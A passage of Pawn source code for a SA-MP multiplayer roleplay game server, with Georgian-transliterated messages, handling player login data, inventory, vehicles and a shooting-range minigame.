	pData[playerid][pLimit] = cache_get_field_content_int(0, "limit", mysql);
	pData[playerid][pDvijok] = cache_get_field_content_int(0, "dvijok", mysql);
	pData[playerid][pKolesocar] = cache_get_field_content_int(0, "kolesocar", mysql);
	pData[playerid][pPistol_Skill] = cache_get_field_content_int(0, "Pistol_Skill", mysql);
	pData[playerid][pEagle_Skill] = cache_get_field_content_int(0, "Eagle_Skill", mysql);
	pData[playerid][pShotGun_Skill] = cache_get_field_content_int(0, "ShotGun_Skill", mysql);
	pData[playerid][pMP5_Skill] = cache_get_field_content_int(0, "MP5_Skill", mysql);
	pData[playerid][pAK47_Skill] = cache_get_field_content_int(0, "AK47_Skill", mysql);
	pData[playerid][pM4_Skill] = cache_get_field_content_int(0, "M4_Skill", mysql);
	pData[playerid][pSniper_Skill] = cache_get_field_content_int(0, "Sniper_Skill", mysql);

	if(pData[playerid][pBan] > 0)
	{
	    format(mes,sizeof(mes),"Shen Dagedo Bani Serverze Difficult Stage Real Life. Amdeni Dgit: %d",pData[playerid][pBan]);
	    SendClientMessage(playerid,CRED,mes);
	    return NewKick(playerid);
	}

	new guns[128];
	cache_get_field_content(0, "gun", guns, mysql);
	SetPVarString(playerid,"mysqlgun",guns);

	SetPlayerSkills(playerid);
	SetPVarInt(playerid,"Logined",1);
	SpawnPlayer(playerid);

	new h,m,s;
	gettime(h,m,s);
	if(pData[playerid][pHouse])
	{
		new houseid = pData[playerid][pHouse]-1;
		if(!gHouses[houseid][houseOwner])
		{
			SendClientMessage(playerid,CGRAY,"Tqven Ver Gadaixadet Komunaluri Gadasaxadebi Da Gamogasaxles Otaxidan.");
			pData[playerid][pHouse] = 0;
			UpdatePlayerData(playerid,"house",0);
		}
		else if(!GetString(Name2(playerid),gHouses[houseid][houseOwner]))
		{
			new bool:leave;
			for(new i;i<3;i++)
			{
				if(gHouses[houseid][houseHabitID][i] == pData[playerid][pMysqlID]) {leave = true; break;}
			}
			if(!leave)
			{
				SendClientMessage(playerid,CGRAY,"Saxlis Mtavarma Mplobelma Gamogasaxlat Saxlidan");
				pData[playerid][pHouse] = 0;
				UpdatePlayerData(playerid,"house",0);
			}
		}
		if(GetString(Name2(playerid),gHouses[houseid][houseOwner]))
		{
		    if(pData[playerid][pCar] != 0)
		    {
			    new vid = gVehicles[pData[playerid][pHouse]][vvID];
				if(vid == INVALID_VEHICLE_ID)
				{
				    new vehicleid = CreateVehicle(gTransport[pData[playerid][pCar]-400][trModel],gHouses[pData[playerid][pHouse]-1][houseParkX],gHouses[pData[playerid][pHouse]-1][houseParkY],gHouses[pData[playerid][pHouse]-1][houseParkZ],gHouses[pData[playerid][pHouse]-1][houseParkR],pData[playerid][pColor1],pData[playerid][pColor2],-1);
                    AddVehicleComponent(vehicleid, pData[playerid][pKolesocar]);
					gVehicles[pData[playerid][pHouse]][vvID] = vehicleid;
					SetVehicleHealthEx(vehicleid,1000);
					ToggleLock(vehicleid);
					gVehicles[vehicleid-1][vFuel] = pData[playerid][pFuel];
					gVehicles[vehicleid-1][vProbability] = pData[playerid][pLimit];
					gVehicles[vehicleid-1][vProbability2] = 1;
				}
			}
			if(!pData[playerid][pFraction] && gHouses[houseid][houseSkin][3] != 0)
			{
				gHouses[houseid][houseSkin][3] = 0;
				UpdateHouseDress(houseid);
			}
		}
	}
	if(pData[playerid][pGrain] > 1000)
	{
	    UpdatePlayerData(playerid,"grain",1000);
		pData[playerid][pGrain] = 1000;
		SendClientMessage(playerid,CRED,"Limiti Xelze: 1000 Marcvali");
	}
	if(pData[playerid][pDrugs] > 1000)
	{
	    UpdatePlayerData(playerid,"drugs",1000);
		pData[playerid][pDrugs] = 1000;
		SendClientMessage(playerid,CRED,"Limiti Xelze: 1000 Narkotiki");
	}
	if(pData[playerid][pMoney] > 150000000)
	{
		UpdatePlayerData(playerid,"money",15000000);
		pData[playerid][pMoney] = 15000000;
		SendClientMessage(playerid,CRED,"Limiti Xelze: 15kk");
	}
	if(pData[playerid][pAdmin])
	{
		format(mes,sizeof(mes),"%s[%d] {bbbbbb}Administrator Connected.",Name2(playerid),playerid);
		AdminChat(0xFF0022FF,mes);
	}
	if(pData[playerid][pHelper])
	{
		format(mes,sizeof(mes),"%s[%d] {bbbbbb}Helper Connected.",Name2(playerid),playerid);
		AdminChat(0xFF0022FF,mes);
	}
	new warn;
	if(pData[playerid][pWarn])
	{
		warn = del(pData[playerid][pWarn]-gCurDay,WARN_TIME);
        format(mes,sizeof(mes),"Tqven Warmoadginet %d Gafrtxilebis Done | 1 Warn = 1 Day.",warn);
        SendClientMessage(playerid,CRED,mes);
	}
	if(pData[playerid][pWarn] && pData[playerid][pWarn] <= gCurDay)
	{
		pData[playerid][pWarn] = 0;
		UpdatePlayerData(playerid,"warn",0);
		SendClientMessage(playerid,CGREEN,"Mogexsnat Yvela Gafrtxileba.");
	}
	if(pData[playerid][pPhone]) SetPVarInt(playerid,"TPhone",1);

	new query2[150], ip[32];
	GetPlayerIp(playerid,ip,32);
	format(query2,sizeof(query2),"UPDATE `members` SET `ip` = '%s', `status` = '1' WHERE `nickname` = '%s'",ip,Name2(playerid));
	mysql_empty(mysql, query2);
	return true;
}
forward mysql_itemsCount(playerid, nickname[]);
public mysql_itemsCount(playerid, nickname[]){
	if(!cache_get_row_count(mysql))
		return SendClientMessage(playerid,CGRAY,"Axali Qcevebi Ar Aris Damatebuli.");
	new name[24], money, Fields = cache_get_field_count(mysql);
	f_mysql_fetch_row_format(0, name, Fields);
	sscanf(name, "p<|>d",money);
	pData[playerid][pDonate] += money;
	UpdatePlayerData(playerid,"donate",pData[playerid][pDonate]);
	SendClientMessage(playerid, CINFO, "Chairicxa Axali Abiturienti.");
	new query[128];
	format(query, sizeof(query),"DELETE FROM unitpay_payments WHERE account = '%s'",nickname);
	mysql_empty(mysql, query);
	return true;
}
stock Name2(playerid)
{
	new pl[36];
	GetPlayerName(playerid,pl,36);
	return pl;
}
stock Pokaz(playerid,ider,kolvo,danet)
{
	new fing,mes2[40];
	switch(ider) {
 	    case 1: fing = 1212;
 	    case 2: fing = 2061;
 	    case 3: fing = 1252;
 	    case 4: fing = 1241;
 	    case 5: fing = 19063;
 	}
    PlayerTextDrawSetPreviewModel(playerid,gUpdateInfo[2][playerid], fing);
	PlayerTextDrawSetPreviewRot(playerid, gUpdateInfo[2][playerid], 20.000000, -40.000000, 0.000000, 0.700000);
    for(new i=0; i < 3; i++) PlayerTextDrawShow(playerid,gUpdateInfo[i][playerid]);

    format(mes2,sizeof(mes2),"%s%d",(danet == 0) ? ("~r~-") : ("~g~+"),kolvo);
	PlayerTextDrawSetString(playerid,gUpdateInfo[1][playerid],mes2);
	SetTimerEx("ClosePokaz",3000,false,"i",playerid);
	PlayerPlaySound(playerid,1056,0.0,0.0,0.0);
    return true;
}
forward ClosePokaz(playerid);
public ClosePokaz(playerid)
{
    if(!IsPlayerConnected(playerid)) return true;
    for(new i=0; i < 3; i++) PlayerTextDrawHide(playerid,gUpdateInfo[i][playerid]);
	return true;
}
stock OpenInventory(playerid)
{
    updateEda(playerid);
    for(new i; i < 16; i++)
	{
        if(InventoryPlayer[playerid][invSlot][i] == 0) PlayerTextDrawSetPreviewModel(playerid,Inventory[i + 1][playerid], 19461),PlayerTextDrawSetPreviewRot(playerid, Inventory[i + 1][playerid], 0.000000, 0.000000, 90.000000, 0.100000);
        else PlayerTextDrawSetPreviewModel(playerid,Inventory[i + 1][playerid], Items_All[InventoryPlayer[playerid][invSlot][i]][invObject]),PlayerTextDrawSetPreviewRot(playerid, Inventory[i + 1][playerid], 20.000000, -40.000000, 0.000000, 0.700000);
	}
	for(new i=1; i < 16; i++) PlayerTextDrawShow(playerid,Inventory[i][playerid]);
	return true;
}
stock GiveInventory(playerid, item, amount, del)
{
	for(new k=0; k < 16; k++)
	{
	    if(del == 1 && InventoryPlayer[playerid][invSlot][k] == item) return InventoryPlayer[playerid][invKol][k] = amount;
	    if(del == 0 && InventoryPlayer[playerid][invSlot][k] == item) return InventoryPlayer[playerid][invKol][k] += amount;
		if(InventoryPlayer[playerid][invSlot][k] == 0)
		{
			InventoryPlayer[playerid][invSlot][k] = item;
			InventoryPlayer[playerid][invKol][k] = amount;
			return true;
		}
	}
	return false;
}
stock GetPlayerWeapontInt(weaponid)
{
	switch(weaponid)
	{
		case 333: return 2;
		case 334: return 3;
		case 335: return 4;
		case 336: return 5;
		case 337: return 6;
		case 339: return 8;
		case 325: return 14;
		case 342: return 17;
		case 346: return 22;
		case 347: return 23;
		case 348: return 24;
		case 349: return 25;
		case 351: return 27;
		case 352: return 28;
		case 353: return 29;
		case 355: return 30;
		case 356: return 31;
		case 357: return 33;
		case 358: return 34;
		case 371: return 36;
		case 365: return 41;
		case 366: return 42;
		case 367: return 43;
		case 372: return 32;
	}
	return -1;
}
stock updateEda(playerid)
{
    if(pTemp[playerid][pEda][0] > 0) GiveInventory(playerid, 29, pTemp[playerid][pEda][0],1);
	if(pTemp[playerid][pEda][1] > 0) GiveInventory(playerid, 31, pTemp[playerid][pEda][1],1);
	if(pTemp[playerid][pEda][3] > 0) GiveInventory(playerid, 32, pTemp[playerid][pEda][3],1);
	if(pTemp[playerid][pEda][4] > 0) GiveInventory(playerid, 33, pTemp[playerid][pEda][4],1);
	if(pTemp[playerid][pEda][5] > 0) GiveInventory(playerid, 34, pTemp[playerid][pEda][5],1);
	if(pTemp[playerid][pEda][6] > 0) GiveInventory(playerid, 35, pTemp[playerid][pEda][6],1);
	if(pTemp[playerid][pEda][7] > 0) GiveInventory(playerid, 36, pTemp[playerid][pEda][7],1);
	if(pTemp[playerid][pEda][8] > 0) GiveInventory(playerid, 28, pTemp[playerid][pEda][8],1);
    if(pData[playerid][pDrugs] > 0) GiveInventory(playerid, 25, pData[playerid][pDrugs], 1);
	if(pData[playerid][pGunAmount] > 0) GiveInventory(playerid, 43, pData[playerid][pGunAmount], 1);
	if(pData[playerid][pAmmo] > 0) GiveInventory(playerid, 42, pData[playerid][pAmmo], 1);
	if(pData[playerid][pGrain] > 0) GiveInventory(playerid, 44, pData[playerid][pGrain], 1);
	if(pData[playerid][pMoney] >= 1) GiveInventory(playerid, 41, pData[playerid][pMoney], 1);
	GiveInventory(playerid, 37, 1, 1);
	GiveInventory(playerid, 26, 1, 1);
	if(pData[playerid][pFractionSkin] > 0) GiveInventory(playerid, 40, 1, 1);
}
stock CloseInventory(playerid)
{
    SetPVarInt(playerid,"StatisticD",0);
    TextDrawHideForPlayer(playerid,Statistic[SkinPlayer]);
    TextDrawHideForPlayer(playerid,Statistic[SkinExit]);
    TextDrawHideForPlayer(playerid,Statistic[SkinUpdate]);
    TextDrawHideForPlayer(playerid,Statistic[SkinWeapon]);
    TextDrawHideForPlayer(playerid,Statistic[SkinEatText]);
    TextDrawHideForPlayer(playerid,Statistic[SkinText2]);
    for(new i=0; i < 8; i++) TextDrawHideForPlayer(playerid,Statistic[SkinText3][i]);
    TextDrawHideForPlayer(playerid, TextdrawStats);
    HideProgressBarForPlayer(playerid,qhealth2);
	HideProgressBarForPlayer(playerid,qhealth3);
	HideProgressBarForPlayer(playerid,qhealth4);
	HideProgressBarForPlayer(playerid,qhealth5);
	HideProgressBarForPlayer(playerid,qhealth6);
    if(GetPVarInt(playerid,"ChangeSlot") > 0)
	{
        PlayerTextDrawBackgroundColor(playerid,Inventory[GetPVarInt(playerid,"ChangeSlot")][playerid], -86);
        PlayerTextDrawShow(playerid,Inventory[GetPVarInt(playerid,"ChangeSlot")][playerid]);
        SetPVarInt(playerid,"ChangeSlot",0);
        SetPVarInt(playerid,"SelectSlot",0);
	}
	for(new i=1; i < 16; i++) PlayerTextDrawHide(playerid,Inventory[i][playerid]);
    CancelSelectTextDraw(playerid);
}
stock inventUP(playerid)
{
    for(new k=0; k < 16; k++)
	{
	    new tff = InventoryPlayer[playerid][invSlot][k];
		if(tff == 40 || tff == 39 || tff == 25 || tff == 37 || tff == 28 || tff == 36 || tff == 35 || tff == 34 || tff == 33 || tff == 32 || tff == 31 || tff == 27 || tff == 29 || tff == 43 || tff == 42)
		{
			InventoryPlayer[playerid][invSlot][k] = 0;
			InventoryPlayer[playerid][invKol][k] = 0;
		}
	}
}
forward OpenPoezd(playerid);
public OpenPoezd(playerid)
{
	TogglePlayerControllable(playerid,1);
	ClearAnimations(playerid);
	DisablePlayerCheckpoint(playerid);
	SetPlayerPos(playerid,80.7575,-323.8325,1095.2209);
	SetPlayerFacingAngle(playerid,174.9864);
	GoAnim(playerid,"CRACK","Crckidle1",4.1,1,0,0,0,0,0);
	SetTimerEx("BusGO",7000,false,"i",playerid);
}
forward BusGO(playerid);
public BusGO(playerid)
{
    TextDrawShowForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
    if(GetPVarInt(playerid,"Busser") == 0) GameTextForPlayer(playerid, "~y~Los-Santos", 5000, 1);
    else if(GetPVarInt(playerid,"Busser") == 1) GameTextForPlayer(playerid, "~y~San-Fiero", 5000, 1);
    else if(GetPVarInt(playerid,"Busser") == 2) GameTextForPlayer(playerid, "~y~Las-Venturas", 5000, 1);
    SetTimerEx("BusGO2",3000,false,"i",playerid);
}
forward BusGO2(playerid);
public BusGO2(playerid)
{
    TextDrawHideForPlayer(playerid,gInterfaceElement[C_ELEMENT_BACKGROUND]);
    ClearAnimations(playerid);
    SetCameraBehindPlayer(playerid);
}
forward TakeTSZAVOD(playerid);
public TakeTSZAVOD(playerid)
{
    SetPVarInt(playerid,"gunamount",1);
	SendClientMessage(playerid,CWHITE,"Tqven Aiget Detali. Midit Witel Rgoltan .");
	ClearAnimations(playerid);
	ApplyAnimation(playerid,"CARRY","crry_prtial",4.0,1,1,1,1,1,1);
	SetPlayerAttachedObject(playerid,0,1136,5,0.0,0.10,-0.2, -80.0,0.0,0.0);
	SetPVarInt(playerid,"kida",7);
	SetPVarInt(playerid,"woodamount",4);

	new id = RandomEx(0,7);
	SetPlayerCheckpoint(playerid,gWoodCPs[id][0],gWoodCPs[id][1],gWoodCPs[id][2],1.0);
	SetPVarInt(playerid,"loadid",id);
}
stock Dvijki(playerid)
{
    if(pData[playerid][pCar] == 401) cenaj[playerid] = 15000;
	if(pData[playerid][pCar] == 402) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 404) cenaj[playerid] = 20000;
	if(pData[playerid][pCar] == 405) cenaj[playerid] = 25000;
	if(pData[playerid][pCar] == 410) cenaj[playerid] = 15000;
	if(pData[playerid][pCar] == 411) cenaj[playerid] = 70000;
	if(pData[playerid][pCar] == 412) cenaj[playerid] = 25000;
	if(pData[playerid][pCar] == 419) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 421) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 426) cenaj[playerid] = 32000;
	if(pData[playerid][pCar] == 429) cenaj[playerid] = 45000;
	if(pData[playerid][pCar] == 436) cenaj[playerid] = 18000;
	if(pData[playerid][pCar] == 439) cenaj[playerid] = 20000;
	if(pData[playerid][pCar] == 445) cenaj[playerid] = 33000;
	if(pData[playerid][pCar] == 451) cenaj[playerid] = 58000;
	if(pData[playerid][pCar] == 458) cenaj[playerid] = 20000;
	if(pData[playerid][pCar] == 466) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 467) cenaj[playerid] = 22000;
	if(pData[playerid][pCar] == 474) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 475) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 477) cenaj[playerid] = 35500;
	if(pData[playerid][pCar] == 479) cenaj[playerid] = 20000;
	if(pData[playerid][pCar] == 480) cenaj[playerid] = 40000;
	if(pData[playerid][pCar] == 491) cenaj[playerid] = 28000;
	if(pData[playerid][pCar] == 492) cenaj[playerid] = 26000;
	if(pData[playerid][pCar] == 496) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 500) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 506) cenaj[playerid] = 43000;
	if(pData[playerid][pCar] == 507) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 517) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 518) cenaj[playerid] = 25000;
	if(pData[playerid][pCar] == 526) cenaj[playerid] = 25000;
	if(pData[playerid][pCar] == 527) cenaj[playerid] = 18000;
	if(pData[playerid][pCar] == 529) cenaj[playerid] = 18000;
	if(pData[playerid][pCar] == 533) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 534) cenaj[playerid] = 36000;
	if(pData[playerid][pCar] == 535) cenaj[playerid] = 25000;
	if(pData[playerid][pCar] == 536) cenaj[playerid] = 26000;
	if(pData[playerid][pCar] == 540) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 541) cenaj[playerid] = 50000;
	if(pData[playerid][pCar] == 542) cenaj[playerid] = 5000;
	if(pData[playerid][pCar] == 545) cenaj[playerid] = 15000;
	if(pData[playerid][pCar] == 546) cenaj[playerid] = 15500;
	if(pData[playerid][pCar] == 547) cenaj[playerid] = 15500;
	if(pData[playerid][pCar] == 549) cenaj[playerid] = 15500;
	if(pData[playerid][pCar] == 550) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 551) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 555) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 558) cenaj[playerid] = 23000;
	if(pData[playerid][pCar] == 559) cenaj[playerid] = 37000;
	if(pData[playerid][pCar] == 560) cenaj[playerid] = 40000;
	if(pData[playerid][pCar] == 561) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 562) cenaj[playerid] = 45000;
	if(pData[playerid][pCar] == 565) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 566) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 576) cenaj[playerid] = 31000;
	if(pData[playerid][pCar] == 580) cenaj[playerid] = 35000;
	if(pData[playerid][pCar] == 585) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 587) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 589) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 600) cenaj[playerid] = 10000;
	if(pData[playerid][pCar] == 602) cenaj[playerid] = 30000;
	if(pData[playerid][pCar] == 603) cenaj[playerid] = 50000;
	return cenaj[playerid];
}
forward LoadingScreenTimer(playerid);
public LoadingScreenTimer(playerid)
{
	new sctr[60];
    SetPVarInt(playerid,"LoadingPercentage", GetPVarInt(playerid,"LoadingPercentage") + 1);
	if(GetPVarInt(playerid,"LoadingPercentage") <= 20) format(sctr,sizeof(sctr),"%d%%~n~~r~Removing the engine", GetPVarInt(playerid,"LoadingPercentage"));
    else if(GetPVarInt(playerid,"LoadingPercentage") <= 60) format(sctr,sizeof(sctr),"%d%%~n~~y~Insertion of a new engine", GetPVarInt(playerid,"LoadingPercentage"));
    else if(GetPVarInt(playerid,"LoadingPercentage") > 60) format(sctr,sizeof(sctr),"%d%%~n~~g~Connection engine", GetPVarInt(playerid,"LoadingPercentage"));
	TextDrawSetString(RegisterLoginTD[playerid], sctr);
	if(GetPVarInt(playerid,"LoadingPercentage") >= 100)
	{
	    pData[playerid][pLimit] = 1;
	    UpdatePlayerData(playerid,"limit",pData[playerid][pLimit]);
	    TextDrawHideForPlayer (playerid, RegisterLoginTD[playerid]);
	    gVehicles[pData[playerid][pHouse]][vProbability2] = 1;
	    gVehicles[pData[playerid][pHouse]][vProbability] = 0;
	    KillTimer(LST[playerid]);
	    SetPVarInt(playerid,"LoadingPercentage", 0);
	    SetCameraBehindPlayer(playerid);
	    SendClientMessage(playerid,CGREEN,"Tqven Warmatebit Ganaaxlet Sistema.");

	    new engine,lights,alarm,doors,bonnet,boot,objective;
		GetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,bonnet,boot,objective);
     	SetVehicleParamsEx(gVehicles[pData[playerid][pHouse]][vvID],engine,lights,alarm,doors,0,boot,objective);
	}
	return true;
}
forward SetMark(playerid, id);
public SetMark(playerid, id)
{
    SetPVarInt(playerid,"Marked",0);
	if(GetPlayerInterior(id) || GetPlayerVirtualWorld(id)) return SendClientMessage(playerid,CYELLOW,"Motamashe Ar Aris Agmochenili");
	new Float:x, Float:y, Float:z;
	GetPlayerPos(id,x,y,z);
	SetPlayerCheckpoint(playerid,x,y,z,4.0);
	SetPVarInt(playerid,"GPS",1);
	SendClientMessage(playerid,CYELLOW,"Es Sateliti Gamoigzavna Tqventan.");
	return true;
}
stock ShowTirTutDialog(playerid, tirid)
{
	new string[600];
	strcat(string, "{FFD700}Mogesalmebit! {FFFFFF}Tqven Imyofebit Tir-shi.\n");
	strcat(string, "Tirshi Shegidzliat Daxvewot Tqveni Srolis Gamocdileba.\n");
	strcat(string, "Sasrolat Chven Gvaqvs Ramodenime Iaragi.\n");
	strcat(string, "Am Iaragebidan Amoirchiet Romelime Iaragi.\n");
	strcat(string, "Kacze Gamosaxulia 5 Nishani Sadac Unda Esrolot.\n");
	strcat(string, "Rodesac Gamochndeba Kubikebi Eseigi Tqven Moartyit.\n");
	strcat(string, "Srolis Gasartuleblad Kaci Wamova Tqvensken.\n\n");
	strcat(string, "{FF6322}1. Tqven Unda Moartyat 5-ive Wertils.\n");
	strcat(string, "{FF6347}2. Shemdeg Da Shemdeg Sichqare Aiwevs\n\n");
	strcat(string, "{AFAFAF}\t\tDaachiret 'NEXT' Gasagrdzeleblad.\n");
	TirPlayer[playerid] = tirid;
	ShowPlayerDialog(playerid, dTirD, 0, "Tir | INFO", string, "NEXT", "CLOSE");
	return true;
}
stock ShowTirDialog(playerid)
{
    new str[500], string[70];
    for(new g; g < sizeof(TGunInfo);g ++)
    {
		format(string,sizeof(string),"%i. %s $%d\n", g+1, TGunInfo[g][tgGunname], TGunInfo[g][tgCost]);
		strcat(str, string);
	}
	ShowPlayerDialog(playerid, dTirD1, 2, "Tiri | Iaragis Archevani", str, "Archeva", "Daxurva");
	return true;
}
stock GetTirAmmo(weaponid)
{
	new ammo;
	switch(weaponid)
	{
	    case 22: ammo = 250;
	    case 23: ammo = 200;
	    case 24: ammo = 100;
	    case 25: ammo = 80;
	    case 29: ammo = 400;
	    case 30: ammo = 300;
	    case 31: ammo = 300;
	    case 34: ammo = 50;
	}
	return ammo;
}
forward MoveTarget(playerid);
public MoveTarget(playerid)
{
    if(PlayerTir[playerid] != -1)
    {
        new tir = PlayerTir[playerid];
	    new string[10];
	    StartCount[playerid] --;
	    if(StartCount[playerid] > 0)
	 	{
	 	    if(StartCount[playerid] == 1)
	        {
	            new ammo = GetTirAmmo(TirGun[playerid]);
	            GivePlayerWeaponEx(playerid, TirGun[playerid], ammo);
				TirAmmo[playerid] = ammo;
	        }
		    format(string,sizeof(string),"%d",StartCount[playerid]);
		    GameTextForPlayer(playerid,string,1500,4);
			PlayerPlaySound(playerid, 1056, 0, 0, 0);
		    if(TargetTimer[tir] != -1) KillTimer(TargetTimer[tir]);
		    TargetTimer[tir] = SetTimerEx("MoveTarget", 1500, false, "i", playerid);
	    }
	    else
	    {
	        StartCount[playerid] = 4;
	        PlayerPlaySound(playerid, 1057, 0, 0, 0);
	        GameTextForPlayer(playerid,"Go-Go-Go!!!",1000,4);
	        SetPlayerArmedWeapon(playerid, TirGun[playerid]);
	        TirAmmo[playerid] = GetPlayerAmmo(playerid);
	        TargetGo[tir] = true;
	        SetDynamicObjectRot(Target_Object[tir], 0.0, TirInfo[tir][tirTPos][4], TirInfo[tir][tirTPos][5]);
	        MoveDynamicObject(Target_Object[tir], TirInfo[tir][tirTPos][0], TirInfo[tir][tirTPos][1]-15.0, TirInfo[tir][tirTPos][2], TargetMoveSpeed[playerid]);
	        if(TargetTimer[tir] != -1) KillTimer(TargetTimer[tir]);
			TargetTimer[tir] = SetTimerEx("DestroyTarget", TimerTime[playerid], false, "iid", playerid, tir, 0);
			TextDrawHideForPlayer(playerid, TirDraw[0]);
			TextDrawHideForPlayer(playerid, TirDraw[1]);
			TextDrawHideForPlayer(playerid, TirDraw[2]);
			TextDrawHideForPlayer(playerid, TirDraw[3]);
			TextDrawHideForPlayer(playerid, TirDraw[4]);
	    }
    }
    return true;
}
forward DestroyTarget(playerid, tirid, succes);
public DestroyTarget(playerid, tirid, succes)
{
    if(succes)
	{
	    switch(TirGun[playerid])
	    {
	        case 22:
			{
			    if(pData[playerid][pPistol_Skill] <= 9900) pData[playerid][pPistol_Skill] += 50;
				else pData[playerid][pPistol_Skill] = 10000;
			}
			case 24:
			{
				if(pData[playerid][pEagle_Skill] <= 9900) pData[playerid][pEagle_Skill] += 100;
				else pData[playerid][pEagle_Skill] = 10000;
			}
			case 25:
			{
				if(pData[playerid][pShotGun_Skill] <= 9900) pData[playerid][pShotGun_Skill] += 100;
				else pData[playerid][pShotGun_Skill] = 10000;
			}
			case 29:
			{
				if(pData[playerid][pMP5_Skill] <= 9900) pData[playerid][pMP5_Skill] += 100;
				else pData[playerid][pMP5_Skill] = 10000;
			}
			case 30:
			{
				if(pData[playerid][pAK47_Skill] <= 9900) pData[playerid][pAK47_Skill] += 100;
				else pData[playerid][pAK47_Skill] = 10000;
			}
			case 31:
			{
				if(pData[playerid][pM4_Skill] <= 9900) pData[playerid][pM4_Skill] += 100;
				else pData[playerid][pM4_Skill] = 10000;
			}
			case 34:
			{
				if(pData[playerid][pSniper_Skill] <= 9900) pData[playerid][pSniper_Skill] += 100;
				else pData[playerid][pSniper_Skill] = 10000;
			}
	    }
	    SendClientMessage(playerid, CYELLOW, "Shen Gaiumjobese Skilis 1%%");
		GameTextForPlayer(playerid,"~g~Succes!",3000,5);
		TargetMoveSpeed[playerid] += 0.2;
		TargetCount[playerid] ++;
		TimerTime[playerid] -= 1000;
    }
    else GameTextForPlayer(playerid,"~r~Fail!",3000,5);
    SetPlayerArmedWeapon(playerid, 0);
    ResetPlayerWeapons(playerid);
    StartCount[playerid] = 4;
    TargetGo[tirid] = false;
    SetPlayerArmedWeapon(playerid, 0);
    if(TargetTimer[tirid] != -1) KillTimer(TargetTimer[tirid]);
    for(new i;i < 5;i ++)
    {
        HitPoint[playerid][i] = false;
        HitCount[playerid][i] = 0;
    }
    if(TargetCount[playerid] <= 5) TargetTimer[tirid] = SetTimerEx("MoveTarget", 2000, false, "i", playerid);
	else CheckTir(playerid);
	DestroyDynamicObject(Target_Object[tirid]);
	Target_Object[tirid] = CreateDynamicObject(1586, TirInfo[tirid][tirTPos][0], TirInfo[tirid][tirTPos][1], TirInfo[tirid][tirTPos][2], TirInfo[tirid][tirTPos][3], TirInfo[tirid][tirTPos][4], TirInfo[tirid][tirTPos][5], TirInfo[tirid][tirWorld], TirInfo[tirid][tirInt]);
    Streamer_UpdateEx(playerid,TirInfo[tirid][tirTPos][0], TirInfo[tirid][tirTPos][1], TirInfo[tirid][tirTPos][2]);
	return true;
}
stock CheckTir(playerid)
{
	new tir = PlayerTir[playerid];
	if(tir != -1)
	{
	    if(TirBusy[tir])
	    {
		    TirBusy[tir] = false;
		    TargetTimer[tir] = -1;
		    TargetGo[tir] = false;
		    if(TargetTimer[tir] != -1) KillTimer(TargetTimer[tir]);
		    DestroyDynamicObject(Target_Object[tir]);
		    Target_Object[tir] = CreateDynamicObject(1586, TirInfo[tir][tirTPos][0], TirInfo[tir][tirTPos][1], TirInfo[tir][tirTPos][2], TirInfo[tir][tirTPos][3], TirInfo[tir][tirTPos][4], TirInfo[tir][tirTPos][5], TirInfo[tir][tirWorld], TirInfo[tir][tirInt]);
		    UpdateDynamic3DTextLabelText(TirText[tir],CGREEN,"-== Tiri ==-\n\n{FFFFFF}Sasroli Adgili");
		    for(new idxf=0, i=0; idxf<cvector_size(players); idxf++)
		    {
		        i = cvector_get(players, idxf);
		        if(!IsPlayerConnected(i)) continue;
		        TogglePlayerDynamicCP(i, Tir_CP[tir], true);
			}
	    }
	    ResetPlayerWeapons(playerid);
	    PlayerTir[playerid] = -1;
		for(new i;i < 5;i ++)
	    {
	        HitPoint[playerid][i] = false;
	        HitCount[playerid][i] = 0;
	    }
		TargetCount[playerid] = 0;
		TargetMoveSpeed[playerid] = 1.0;
		TimerTime[playerid] = 10000;
		StartCount[playerid] = 4;
		TextDrawHideForPlayer(playerid, TirDraw[0]);
		TextDrawHideForPlayer(playerid, TirDraw[1]);
		TextDrawHideForPlayer(playerid, TirDraw[2]);
		TextDrawHideForPlayer(playerid, TirDraw[3]);
		TextDrawHideForPlayer(playerid, TirDraw[4]);
        TextDrawHideForPlayer(playerid, TirBGDraw);
	}
	return true;
}
stock CheckHit(playerid)
{
	if(HitPoint[playerid][0] && HitPoint[playerid][1] && HitPoint[playerid][2] && HitPoint[playerid][3] && HitPoint[playerid][4])
	{
	    new tir = PlayerTir[playerid];
	    DestroyTarget(playerid, tir, true);
	}
	return true;
}
stock TargetFireCount(weaponid)
{
	new count;
	switch(weaponid)
	{
	    case 22: count = 3;
	    case 23: count = 3;
	    case 24: count = 1;
	    case 25: count = 1;
	    case 29: count = 5;
	    case 30: count = 4;
	    case 31: count = 4;
	    case 33: count = 1;
	    default: count = -1;
	}
	return count;
}
stock Float:DistanceCameraTargetToLocation(Float:CamX, Float:CamY, Float:CamZ, Float:ObjX, Float:ObjY, Float:ObjZ, Float:FrX, Float:FrY, Float:FrZ)
{
	new Float:TGTDistance;
	TGTDistance = floatsqroot((CamX - ObjX) * (CamX - ObjX) + (CamY - ObjY) * (CamY - ObjY) + (CamZ - ObjZ) * (CamZ - ObjZ));
	new Float:tmpX, Float:tmpY, Float:tmpZ;
	tmpX = FrX * TGTDistance + CamX;
	tmpY = FrY * TGTDistance + CamY;
	tmpZ = FrZ * TGTDistance + CamZ;
